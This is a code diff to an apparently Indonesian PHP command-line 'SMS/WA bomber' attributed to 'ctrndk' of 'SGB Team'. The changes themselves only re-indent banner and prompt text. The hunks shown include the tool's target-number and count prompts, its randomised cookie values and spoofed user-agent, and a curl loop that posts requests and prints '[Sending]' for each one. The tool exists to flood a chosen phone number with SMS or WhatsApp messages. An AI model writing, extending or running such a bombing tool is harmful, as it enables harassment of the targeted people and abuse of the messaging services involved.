@@ -23,19 +23,19 @@ if(strtolower(substr(PHP_OS, 0, 3)) == 'win') {
     $ua = 'Mozilla/5.0 (Linux; Android 5.1.1; Andromax A16C3H Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36';
     system('clear');
 }
-echo $R."\n   +++++++++++++++++++++++++++++++++++++++";
-echo "\n   +   ".$B."Author  : ctrndk                  ".$R.'+';
-echo "\n   +   ".$B."Github  : @ctrndk                 ".$R.'+';
-echo "\n   +   ".$B."Team    : SGB Team                ".$R.'+';
-echo "\n   ++++++++++++++++++++++++++++++++++++++".$R.'+';
-echo "\n   +  ".$B."Pakai Kode 62... untuk BOM SMS     ".$R.'+';
-echo "\n   +  ".$B."Pakai Kode 08... untuk BOM WA      ".$R.'+';
-echo $R."\n   >================[ ctrndk ]=========(@)>".$X."\n";
-echo $G."Nomor Target : ".$X;
+echo $R."\n             +++++++++++++++++++++++++++++++++++++++";
+echo "\n             +   ".$B."Author  : ctrndk                  ".$R.'+';
+echo "\n             +   ".$B."Github  : @ctrndk                 ".$R.'+';
+echo "\n             +   ".$B."Team    : SGB Team                ".$R.'+';
+echo "\n             ++++++++++++++++++++++++++++++++++++++".$R.'+';
+echo "\n             +  ".$B."Pakai Kode 62... untuk BOM SMS     ".$R.'+';
+echo "\n             +  ".$B."Pakai Kode 08... untuk BOM WA      ".$R.'+';
+echo $R."\n             >================[ ctrndk ]=========(@)>".$X."\n\n";
+echo $G."             Nomor Target : ".$X;
 $nomer = trim(fgets(STDIN));
-echo $G."Jumlah : ".$X;
+echo $G."             Jumlah : ".$X;
 $jumlah = trim(fgets(STDIN));
-echo $R."   +======================================+".$X."\n\n";
+echo $R."             +======================================+".$X."\n\n";
 for($a=0;$a<=$jumlah-1;$a++) {
 	$rand1 = md5(rand(12345678,98765432));
 	$rand2 = md5(rand(12345678,98765432));
@@ -75,6 +75,7 @@ Cookie: identity=".$rand1."; browser_id=".$rand2."; _ga=GA1.2.1024758930.1531960
 	curl_setopt($ch, CURLOPT_POSTFIELDS, $ar);
 	$asw = curl_exec($ch);
 	curl_close($ch);
+	print "             ";
 	print $a+1;
 	print ". ".$nomer;
 	print $G." [Sending]\n".$X;
